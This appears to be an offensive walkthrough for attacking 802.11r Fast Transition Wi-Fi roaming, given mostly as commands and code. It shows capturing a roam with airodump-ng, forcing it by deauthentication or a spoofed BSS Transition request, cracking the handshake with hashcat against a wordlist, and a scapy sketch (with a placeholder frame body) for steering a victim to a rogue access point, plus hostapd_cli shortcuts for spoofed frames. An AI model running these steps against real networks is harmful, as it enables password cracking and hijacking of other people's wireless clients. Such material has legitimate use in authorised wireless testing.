# Fast Transition walkthrough — capture, crack, spoof

**Verified against:** hostapd 2.11 + hcxdumptool 7.3 as of 2026-Q3

## Capturing an FT roam

Set up two monitor interfaces if possible (one on each candidate
channel), or channel-hop between them:

```
airodump-ng -c 6,44 --bssid AA:BB:CC:DD:EE:FF wlan1mon

# Force a roam by deauthing off the current AP (if PMF is off) or
# spoof a Neighbor Report / BTM Request naming the second AP.

hcxpcapngtool -o /tmp/ft.22000 /tmp/roam.pcapng
hashcat -m 22000 /tmp/ft.22000 rockyou.txt
```

The 22000 line for an FT capture has the same shape as a PMKID
capture — the PMK-R1-derived value serves the same role.

## Spoofing a BTM Request

```
# scapy — BTM Request Action frame
from scapy.all import *

btm = RadioTap() / Dot11(
    type=0, subtype=13,          # management, action
    addr1=VICTIM_MAC,
    addr2=ROGUE_BSSID,
    addr3=ROGUE_BSSID,
) / Dot11Auth()                   # placeholder — replace with WNM Action

# The action-frame body follows IEEE 802.11-2020 §9.6.13:
#   Category = 10 (WNM)
#   WNM Action = 7 (BSS Transition Management Request)
#   Dialog Token, Request Mode, Disassoc Timer, Validity Interval,
#   Neighbor Report Element pointing at ROGUE_BSSID.
```

Reference implementations exist in `hostapd_cli` (`bss_tm_req` subcommand)
which is the least error-prone way to emit a well-formed BTM.

## Spoofing a Neighbor Report

Similar shape, category = 5 (Radio Measurement), action = 5 (Neighbor
Report Response). `hostapd_cli neighbor_add` is the shortcut.

## Cite

- IEEE Std 802.11-2020 §9.6.13 (WNM Action frames).
- hashcat wiki — mode 22000, example hashes.
- attacks.json: `ft-handshake-capture`, `btm-forced-roam`,
  `neighbor-report-spoof`.
